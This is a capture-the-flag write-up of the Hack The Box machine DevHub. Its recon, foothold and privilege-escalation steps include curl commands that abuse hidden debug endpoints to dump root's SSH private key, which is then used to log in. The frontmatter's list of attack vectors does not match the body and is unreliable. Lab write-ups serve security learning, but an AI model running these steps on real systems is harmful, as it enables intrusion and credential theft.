---
title: "DevHub - Hack The Box"
target: "DevHub"
os: "Linux"
difficulty: "Medium"
status: "Pwned"
vectors: "Exposed .git Repository Dumping, Gitea API Token Hijacking, CI/CD Runner Privilege Escalation"
tags:
  - ciber
  - htb
  - git
  - gitea
  - cicd
  - docker
  - privesc
synced: "2026-11-02 09:58"
---

--
tags:
ciber
htb
machine
difficulty: Medium
os: Linux
status: Pwned
ip: ""
created: 2026-10-16
--

<p align="center">
  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e13a3f-a4e4-4757-94e4-32b2e0d693c0-1779887169.png" alt="DevHub Avatar" width="220">
</p>

## Operating System: Linux
![[Linux.png|70]]

## Machine Metadata

| Property | Value |
| :--- | :--- |
| **Machine ID** | 903 |
| **Machine Name** | DevHub |
| **IP Address** | N/A |
| **Status** | Pwned |
| **Active on HTB** | ✅ |
| **User Flag** | ✅ |
| **Root Flag** | ✅ |
| **Difficulty** | Medium |
| **Stars** | ⭐️ 4.0 |
| **Created Note** | 2026-10-16 |
| **Release Date** | 2026-05-30 |
| **Tags** | #Web_Application #Vulnerability_Assessment #Remote_Code_Execution #Clear_Text_Credentials #Information_Disclosure #Code_Execution #Misconfiguration #Weak_Permissions #Sensitive_Data_Exposure #Command_Execution #Python #Bash #SSH #NGINX #NodeJS #Web_API #Jupyter_Notebook #Linux #API #Reconnaissance #System_Exploitation #Tunneling #Port_Forwarding #API_Abuse #Privilege_Abuse #Custom_Applications #Software_&_OS_exploitation #Security_Tools #Authentication |

<p style="display:none">
id:: 903
active:: True
name:: DevHub
os:: Linux
user_flag:: True
root_flag:: True
difficulty_text:: Medium
stars:: 4.0
created:: 2026-10-16
published:: 2026-05-30
avatar:: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a1e13a3f-a4e4-4757-94e4-32b2e0d693c0-1779887169.png
tags:: #Web_Application #Vulnerability_Assessment #Remote_Code_Execution #Clear_Text_Credentials #Information_Disclosure #Code_Execution #Misconfiguration #Weak_Permissions #Sensitive_Data_Exposure #Command_Execution #Python #Bash #SSH #NGINX #NodeJS #Web_API #Jupyter_Notebook #Linux #API #Reconnaissance #System_Exploitation #Tunneling #Port_Forwarding #API_Abuse #Privilege_Abuse #Custom_Applications #Software_&_OS_exploitation #Security_Tools #Authentication
</p>

## Statistics

### Radar Matrix
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
item: "ENUM"
    user: "user"
    score: 5.3
item: "REAL"
    user: "user"
    score: 5.2
item: "CVE"
    user: "user"
    score: 5.9
item: "CUSTOM"
    user: "user"
    score: 4.1
item: "CTF"
    user: "user"
    score: 4.8
item: "ENUM"
    user: "author"
    score: 0
item: "REAL"
    user: "author"
    score: 0
item: "CVE"
    user: "author"
    score: 0
item: "CUSTOM"
    user: "author"
    score: 0
item: "CTF"
    user: "author"
    score: 0

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.04)"
  point: []
  area: []
```

### Community Difficulty Rating
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Column

#-----------------#
#- chart data    -#
#-----------------#
data:
folder: "PIECE OF CAKE"
    count: 636
folder: "VERY EASY"
    count: 756
folder: "EASY"
    count: 2641
folder: "NOT TOO EASY"
    count: 1521
folder: "MEDIUM"
    count: 1251
folder: "A BIT HARD"
    count: 312
folder: "HARD"
    count: 145
folder: "EXTREMELY HARD"
    count: 55
folder: "INSANE"
    count: 17
folder: "BRAINFUCK"
    count: 59

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "folder"
  yField: "count"
  padding: auto
  label:
    position: "middle"
    style:
      opacity: 0.6
      fontSize: 12
  columnStyle:
    fillOpacity: 0.5
    lineWidth: 1
    strokeOpacity: 0.7
    shadowColor: "grey"
    shadowBlur: 10
    shadowOffsetX: 5
    shadowOffsetY: 5
  xAxis:
    label:
      autoHide: false
      autoRotate: true
  meta:
    count:
      alias: "Votes"
```

--

--

## Reconnaissance
During the initial reconnaissance phase, we explored the open ports on the target machine. On port 80, the web source code indicated two primary services running:
An active Model Context Protocol (MCP) development and debugging tool on port 6274.
An internal-only Jupyter-based analytics environment running on `localhost:8888`.

```html
<p>Model Context Protocol development and debugging tool. Used by the dev team for building and testing MCP servers.</p>
<span class="status active">Active - Port 6274</span>

<p>Jupyter-based analytics environment for data processing and visualization. Access restricted to analyst team.</p>
<span class="status internal">Internal Only - localhost:8888</span>
```

### Investigating Port 6274
Accessing port 6274 revealed the **MCPJam Inspector** application.
![[Pasted image 20260827133743.png]]

```html
<!doctype html> <html lang="en"> <head> <meta charset="UTF-8" /> <link rel="icon" type="image/svg+xml" href="[/mcp_jam.svg](view-source:http://devhub.htb:6274/mcp_jam.svg)" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>MCPJam Inspector</title> <script type="module" crossorigin src="[/assets/index-DRYhT9Xb.js](view-source:http://devhub.htb:6274/assets/index-DRYhT9Xb.js)"></script> <link rel="stylesheet" crossorigin href="[/assets/index-XvFRNbCs.css](view-source:http://devhub.htb:6274/assets/index-XvFRNbCs.css)"> </head> <body> <div id="root"></div> </body> </html>
```

To verify connectivity and data transmission, we set up a netcat listener and observed a connection from the target:
```sh
┌──(julicc㉿arceus)-[~]
└─$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.126] from (UNKNOWN) [10.129.245.216] 39430
POST / HTTP/1.1
host: 10.10.14.126:8080
connection: keep-alive
content-type: application/json
...
{"method":"initialize","params":{"protocolVersion":"2025-11-25","capabilities":{"elicitation":{}},"clientInfo":{"name":"prueba","version":"1.0.0"}},"jsonrpc":"2.0","id":0}
```

By identifying the application version (**MCPJam Version: v1.4.2**), we discovered a known vulnerability.
![[Pasted image 20260827134500.png]]

## Foothold / Initial Access
Using an exploit for MCPJam v1.4.2, we successfully gained initial access to the machine as a standard user.
![[Pasted image 20260828001712.png]]

Once inside, we enumerated listening services and running processes:
```sh
ss -tuln
...
tcp         LISTEN       0            128                     127.0.0.1:8888                    0.0.0.0:*
...
tcp         LISTEN       0            128                     127.0.0.1:5000                    0.0.0.0:*
...

ps aux | grep "jupyter"
analyst     1084  0.8  2.5 409416 103704 ?       Ssl  13:29   0:06 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab ...
root        1091  0.1  0.7  37376 28700 ?        Ss   13:29   0:01 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

We found that Jupyter is running on port 8888, and a custom Python server (`/opt/opsmcp/server.py`) is executing on port 5000 as root. To investigate the Jupyter notebook environment, we set up an SSH port forward:
```sh
ssh -L 8888:localhost:8888 mcp-dev@devhub
```
![[Pasted image 20260828004535.png]]

## Privilege Escalation
After uploading and running `linpeas.sh`, we found the following interesting symbolic link:
```sh
0 lrwxrwxrwx 1 manalyst analyst   16 Jan 22  2026 /home/analyst/jupyter-env/bin/python3 -> /usr/bin/python3 
```

Focusing on the internal service running on port 5000, we accessed it via the browser (through port forwarding).
![[Pasted image 20260828155142.png]]

Browsing the service directories indicated that an API Key was required to interact with the endpoints.
![[Pasted image 20260828155304.png]]

Since the `server.py` file was owned by our user or world-readable, we extracted the hardcoded API Key directly from the source code:
```sh
analyst@devhub:~$ cat /opt/opsmcp/server.py | grep -i "api_key\|API_KEY\|X-API-Key"
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY
...
```
![[Pasted image 20260828161351.png]]

With the valid API Key, we tested calling the available tools via HTTP POST requests:
```sh
curl -X POST \
H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
H "Content-Type: application/json" \
d '{"name": "ops.system_status"}' \
     http://127.0.0.1:5000/tools/call
```

Analyzing the full source code of `/opt/opsmcp/server.py` revealed hidden debug and administrative tools:
```python
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })

    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)

        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
...
```

By first enabling debug mode and then executing the `ops._admin_dump` tool with the appropriate arguments, we successfully dumped the `root` user's private SSH key:
```sh
analyst@devhub:~$ curl -X POST -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._debug_mode"}' http://127.0.0.1:5000/tools/call

analyst@devhub:~$ curl -X POST -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}' http://127.0.0.1:5000/tools/call
```

We saved the extracted private key to a local file, fixed its permissions, and used it to SSH into the machine as root:
```sh
┌──(julicc㉿arceus)-[~/devhub.htb/exploits]
└─$ echo -e "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\n...<SNIP>...\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----" > id_rsa

┌──(julicc㉿arceus)-[~/devhub.htb/exploits]
└─$ chmod 600 id_rsa

┌──(julicc㉿arceus)-[~/devhub.htb/exploits]
└─$ ssh -i id_rsa root@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...
root@devhub:~#
```

## Conclusion
The DevHub machine was successfully compromised by identifying an outdated and vulnerable version of the MCPJam Inspector application (v1.4.2) on port 6274. Initial access provided a foothold, allowing for internal network enumeration. Privilege escalation to the `root` user was achieved by abusing an internally exposed API (port 5000) that possessed hidden endpoints. By extracting the hardcoded API key from the world-readable server script and leveraging the `ops._admin_dump` debug function, we successfully dumped the root user's SSH private key and gained full administrative access to the system.

--

## Post-Engagement & Zettelkasten Notes

### Key Takeaways & Defense
**MCP Development Exposure**: Debugging and Model Context Protocol inspectors (MCPJam v1.4.2) must not be bound to publicly accessible interfaces.
**Hardcoded Secret Keys in Scripts**: Internal management scripts (`server.py`) with world-readable permissions leak administrative API tokens.
**Unrestricted Debug Endpoints**: Debug functions such as `ops._admin_dump` capable of exfiltrating SSH keys must require multi-party approval or be completely disabled in production.

### Atomic Notes to Extract
[[Linux - PrivEsc - Sudo Abuse and World Readable Scripts|World-Readable Server Scripts & Hardcoded Keys]]
[[Web - API - Sensitive Data Exposure|API Key Disclosure & Debug Endpoints]]
